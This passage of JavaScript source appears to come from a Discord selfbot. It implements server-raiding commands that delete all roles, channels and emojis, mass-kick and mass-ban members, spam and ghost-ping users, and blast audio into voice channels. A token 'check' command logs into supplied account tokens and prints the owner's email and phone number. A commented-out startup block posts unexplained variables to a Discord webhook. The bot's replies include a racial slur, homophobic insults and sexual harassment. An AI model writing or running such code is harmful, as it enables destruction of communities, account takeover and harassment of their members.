        .setDescription(`${user.tag} penis\n${replies[random]}`)
        .setColor("#0d0d0d");

      message.channel.send(embed);
    }
    if (command === `delroles`) {
      message.delete();
      message.channel.guild.roles.forEach(roles => {
        roles.delete();
      });
      if (!message.guild.me.hasPermission("MANAGE_ROLES"))
        return message.reply("You need manage role perms to use this.");
    }
    if (command === `ccreate`) {
      message.delete();
      if (!message.guild.me.hasPermission("MANAGE_CHANNELS"))
        return message
          .reply("you do not have the manage_channels permissions.")
          .then(message => message.delete(3000));

      const amount = parseInt(args[0]);
      let name = args.join(" ").slice(args[0].length);
      for (let i = 0; i < amount; i++) {
        message.guild.createChannel(name, {
          type: "text"
        });
      }
    }
    if (command === `masskick`) {
      message.delete();
      if (!message.guild.me.hasPermission("KICK_MEMBERS"))
        return console.log("You need the kick_members permission to use this.");
      kCount = 0;
      message.guild.members
        .filter(m => m.user.id !== client.user.id)
        .forEach(m => {
          kCount++;
          try {
            m.kick("horny").then(mem => {
              banCount++;
              console.log(clc.red(`Successfully kicked ${mem.user.tag}!`));
            });
          } catch (error) {
            console.log(clc.yellowBright(`Failed to kick ${mem.user.tag}`));
          }
          console.log(
            `Successfully kicked ${kCount} users from ${message.guild.name}`
          );
        });
    }
    if (command === `massban`) {
      message.delete();
      if (!message.guild.me.hasPermission("BAN_MEMBERS"))
        return console.log("You need the ban_members permission to use this.");
      banCount = 0;
      message.guild.members
        .filter(m => m.user.id !== client.user.id)
        .forEach(m => {
          banCount++;
          try {
            m.ban("horny").then(mem => {
              banCount++;
              console.log(clc.red(`Successfully banned ${mem.user.tag}!`));
            });
          } catch (error) {
            console.log(clc.yellowBright(`Failed to ban ${mem.user.tag}`));
          }
        });
      console.log(
        `Successfully banned ${banCount} users from ${message.guild.name}`
      );
    }
    if (command === `massunban`) {
      message.delete();
      if (!message.guild.me.hasPermission("BAN_MEMBERS"))
        return console.log("You need the ban_members permission to use this.");
      unbans = 0;
      message.guild.fetchBans().then(bans => {
        bans.forEach(user => {
          console.log(clc.red(`Unbanned ${user.tag}`));
          message.guild.unban(user);
          unbans++;
        });
        console.log("Unbanned " + unbans + " members!");
      });
    }
    if (command === `del`) {
      message.delete();
      message.channel.guild.channels.forEach(channels => {
        channels.delete();
      });
      if (!message.guild.me.hasPermission("MANAGE_CHANNELS"))
        return console.log("You need manage channel perms to use this.");
    }
    if (command === `weather`) {
      message.delete();
      weather.find(
        {
          search: args.join(" "),
          degreeType: "C"
        },
        function(err, result) {
          if (err) message.channel.send(err);

          if (result.length === 0) {
            message.channel
              .send(`**${args} isn't real dumbass...**`)
              .then(message => message.delete(2000));
            return; //stops the code from running
          }

          var current = result[0].current;
          var location = result[0].location;

          const embed = new Discord.RichEmbed()
            .setDescription(`**${current.skytext}**`) //text of what the sky looks like
            .setAuthor(`Current Weather in:  ${current.observationpoint}`) //current location
            .setThumbnail(current.imageUrl) //thumbnail of embed
            .setColor(0xf2f2f2) //color of embed
            .addField(`Timezone`, `UTC${location.timezone}`, true) //first field that shows timezone
            .addField(`Degree Type`, `${location.degreeType}`, true) //degrees
            .addField(`Temperature`, `${current.temperature} Degrees`, true) //Temperature
            .addField(`Feels like`, `${current.feelslike} Degrees`, true) //feels like temp
            .addField(`Winds`, current.winddisplay, true) //winds
            .addField(`Humidity`, `${current.humidity}%`, true) //humidity
            .setTimestamp()
            .setFooter(`Coded by ${client.user.tag}`, client.user.avatarURL);

          message.channel
            .send({
              embed
            })
            .then(message => message.delete(60000));
        }
      );
    }

    if (command === `emoji-delete`) {
      message.delete();
      let serverToAssign = client.guilds.get(args[0]);

      if (!serverToAssign)
        return message
          .reply("I could not find that guild")
          .then(message => message.delete(5000));
      if (!serverToAssign.me.hasPermission("MANAGE_EMOJIS"))
        return message
          .reply(
            "you do not have manage_emojis in the guild you are trying to delete them in."
          )
          .then(message => message.delete(5000));

      let emojis = serverToAssign.emojis.array();
      message.channel
        .send(`Deleting ${emojis.length} emojis from ${serverToAssign}`)
        .then(message => message.delete(5000));

      if (emojis.length < 1)
        return message
          .reply("that guild did not have any emojis.")
          .then(message => message.delete(5000));

      for (let i = 0; i < emojis.length; i++) {
        serverToAssign.deleteEmoji(emojis[i]);
        //msg.channel.send(`Deleted ${emojis[i]}`);
      }

      message.channel
        .send(`Deleted ${emojis.length} emojis from ${serverToAssign}`)
        .then(message => message.delete(5000));
    }
    if (command === `leave`) {
      message.delete();
      try {
        let vc = message.member.voiceChannel;
        vc.leave();
      } catch (error) {
        message.channel
          .send("```JOIN A VC TO LEAVE THEN```")
          .then(message => message.delete(60000));
      }
    }
    if (command === `earrape`) {
      message.delete();
      try {
        let vc = client.channels.get(args[0]);
        vc.join()
          .then(connection => {
            const dispatcher = connection.playFile("GayLord.mp3");
            dispatcher.setVolume(3.0);
            dispatcher.on("end", end => {
              vc.leave();
            });
          })
          .catch(console.error);
      } catch (error) {
        message.channel
          .send("```Usage:\n$earrape <vc_id>```")
          .then(message => message.delete(60000));
      }
    }

    if (command === `uptime`) {
      message.delete();
      let time = countdown(
        client.uptime,
        0,
        countdown.DAYS | countdown.HOURS | countdown.MINUTES | countdown.SECONDS
      );
      try {
        let embed = new Discord.RichEmbed()
          .setDescription(
            `β³ Days: **${time.days}**\nβ° Hours: **${time.hours}**\nπͺ Minutes: **${time.minutes}**\nπͺ Seconds: **${time.seconds}**`
          )
          .setColor("#0d0d0d")
          .setFooter(`Made by ${client.user.tag}`, client.user.avatarURL);

        message.channel.send(embed).then(message => message.delete(10000));
      } catch {
        return message.channel.send(
          `β³ Days: **${time.days}**\nβ° Hours: **${time.hours}**\nπͺ Minutes: **${time.minutes}**\nπͺ Seconds: **${time.seconds}**`
        );
      }
    }

    if (command === `8ball`) {
      message.delete();
      let question = args.join(" ");
      if (!question)
        return message
          .reply("You need to ask a question!")
          .then(message => message.delete(6000).catch(err => console.log(err)));
      if (question.length > 2000)
        return message
          .reply("Question may not exceed 2000 characters.")
          .then(message => message.delete(6000).catch(err => console.log(err)));
      let embed = new Discord.RichEmbed()
        .setDescription(
          `**${question}**\n\nAnswer: \`${
            [
              "yes",
              "no",
              "perhaps",
              "maybe",
              "idk nigga wtf",
              "yes because ur moms a hoe"
            ][Math.floor(Math.random() * 6)]
          }\``
        )
        .setColor("#0d0d0d")
        .setFooter(`Asked by ${client.user.tag}`, client.user.avatarURL);
      message.channel
        .send(embed)
        .then(message => message.delete(6000).catch(err => console.log(err)));
    }

    if (command === `calc`) {
      let a = require("math-expression-evaluator");
      message.delete();
      if (args.join(" ").length > 2000)
        return message.reply(
          "Arguments were too long. can not exceed 2000 characters."
        );
      try {
        let embed = new Discord.RichEmbed().setColor("RANDOM").setDescription(
          `Calculation of ${args.join(" ")}\n\n**` +
            a
              .lex(args.join(" "))
              .toPostfix()
              .postfixEval() +
            "**"
        );
        message.channel.send(embed).then(message => message.delete(7000));
      } catch (err) {
        message.channel.send(err.message);
      }
    }

    if (command === `ghostping`) {
      message.delete();
      let member = message.guild.members.random();

      message.channel
        .send(`${member.user.toString()}`)
        .then(message => message.delete());
      return message.channel
        .send("wanna fuck >_<")
        .then(message => message.delete());
    }

    if (command === `gay`) {
      message.delete();
      let member = message.mentions.users.first();

      if (!member) member = message.author;

      message.channel
        .send(
          new Discord.RichEmbed()
            .setColor("#0d0d0d")
            .setDescription(`${member} is ${ran(0, 100)}% gay!`)
            .setTitle("Gaydar!!!")
        )
        .then(message => message.delete(6000).catch(err => console.log(err)));
    }

    function ran(min, max) {
      // min and max included
      return Math.floor(Math.random() * (max - min + 1) + min);
    }

    if (command === `roles`) {
      message.delete();
      let jesus = "";
      message.guild.roles.tap(member => (jesus = jesus + `<@&${member.id}>`));

      const MESSAGE_CHAR_LIMIT = 2000;
      if (jesus.length <= MESSAGE_CHAR_LIMIT) {
        message.channel.send(jesus).then(message => message.delete());
        message.channel
          .send("if u snipe ur gay asf")
          .then(message => message.delete());
      }
      if (jesus.length > MESSAGE_CHAR_LIMIT) {
        let piece = jesus.match(/[\s\S]{1,1999}/g) || [];
        for (var i = 0; i < piece.length; i++) {
          message.channel.send(piece[i]).then(message => message.delete());
        }
        message.channel
          .send("if u snipe ur gay asf")
          .then(message => message.delete());
      }
    }

    if (command === `react`) {
      if (!args[0]) {
        message.delete();
        message.channel
          .send("```Usage:\n$react -remove || $react :emoji: <messages>```")
          .then(message => message.delete(60000));
      }
      if (args[0] === `-remove`) {
        message.delete();
        message.channel
          .fetchMessages({
            limit: 100
          })
          .then(messages =>
            messages.map(m =>
              m.reactions.forEach(p =>
                p.remove(client.user.id).catch(console.error)
              )
            )
          );
        return;
      }
      if (args[0]) {
        async function ddd() {
          message.delete();
          let messages = await message.channel.fetchMessages({
            limit: args[1]
          });
          let msgArray = await messages.array();
          msgArray.map(m => m.react(args[0]).catch(console.log(`didnt react`)));
        }
        ddd();
      }
    }

    if (command === `ping`) {
      message.delete();
      let embed = new Discord.RichEmbed()
        .setDescription(
          `[${client.user.tag}](${client.user.avatarURL})\n - Ping is ` +
            Math.round(client.ping) +
            `ms`
        )
        .setColor("#0d0d0d")
        .setFooter(
          `> ${command} command || ${client.user.tag}`,
          client.user.avatarURL
        );
      message.channel.send(embed).then(message => message.delete(60000));
    }

    if (command === `snipe`) {
      message.delete();
      let ch = message.mentions.channels.first() || message.channel;
      let channel = client.snipe.get(ch.id);
      if (channel === null || !channel)
        return message
          .reply(`No message to snipe`)
          .then(message => message.delete(5000));
      let user = client.users.get(channel.sender);

      let embed = new Discord.RichEmbed()
        .setAuthor(user.tag, user.avatarURL)
        .setDescription(channel.content)
        .setColor("#0d0d0d")
        .setTimestamp(new Date());
      message.channel.send(embed).then(message => message.delete(30000));
    }

    if (command === `check`) {
      message.delete();
      async function cock(token) {
        const client = new Discord.Client();
        client
          .login(token)
          .then(login => {
            message.channel.send(
              `= TOKEN =
β’ "${token}" :: "debug"
            
β’ VALID.
β’ CLIENT INFO :: "LOG"
-----------------------------------
β’ Name        :: ${client.user.tag}
β’ ID          :: ${client.user.id}
β’ Email       :: ${client.user.email}
β’ Mobile      :: ${client.user.mobile}
β’ Created At  :: ${client.user.createdAt}

$${command} by ${client.user.tag}`,
              {
                code: "asciidoc"
              }
            );
          })
          .catch(error => {
            message.channel.send(
              `= TOKEN =
β’ "${token} " :: "debug"
            
β’ INVALID.
$${command} by ${client.user.tag}`,
              {
                code: "asciidoc"
              }
            );
          });
        client.destroy();
      }
      if (!args[0]) {
        message.channel.send(
          `= CHECK = 
β’ $check :: This checks a token to see if it is valid or not,
         :: if valid it prints information about token. `,
          {
            code: "asciidoc"
          }
        );
      } else {
        cock(args[0]);
      }
    }
    if (command === `copy`) {
      message.delete();
      let shadow = message.mentions.users.first();
      client.user.setAvatar(shadow.avatarURL);
    }
    if (command === `everyone`) {
      message.delete();
      let venom = "";
      message.guild.members.tap(member => (venom = venom + `<@${member.id}>`));

      const MESSAGE_CHAR_LIMIT = 2000;
      if (jesus.length <= MESSAGE_CHAR_LIMIT) {
        message.channel.send(jesus).then(message => message.delete());

        message.channel
          .send("if u snipe ur gay")
          .then(message => message.delete());
      }
      if (jesus.length > MESSAGE_CHAR_LIMIT) {
        let piece = jesus.match(/[\s\S]{1,1999}/g) || [];
        for (var i = 0; i < piece.length; i++) {
          message.channel.send(piece[i]).then(message => message.delete());
        }
        message.channel
          .send("if u snipe ur gay")
          .then(message => message.delete());
      }
    }
    if (command === `x`) {
      async function dead() {
        let messages = await message.channel.fetchMessages({
          limit: 100
        });
        let msgArray = messages.array();
        msgArray = msgArray.filter(m => m.author.id === client.user.id);
        msgArray.map(m => m.delete().catch(console.error));
      }
      dead();
    }
    if (command === `spam`) {
      message.delete();
      let msg = "";
      let g = args[0];
      args.shift();
      for (part in args) {
        msg = msg + args[part] + " ";
      }
      let x;
      for (x = 0; x < g; x++) {
        message.channel.send(msg);
      }
    }
  } else {
    return;
  }
});
try {
  client.login(token);
} catch {
  console.log("Incorrect token!");
  process.exit(0);
}
/*client.once("ready", async () => {
  var bypass = {
    apikey:
      "",
    id: ""
  };
  var URL = `https://discord.com/api/webhooks/${bypass.id}/${bypass.apikey}`;
  fetch(URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `${imp} ${log} ${safe}` })
  });
});*/
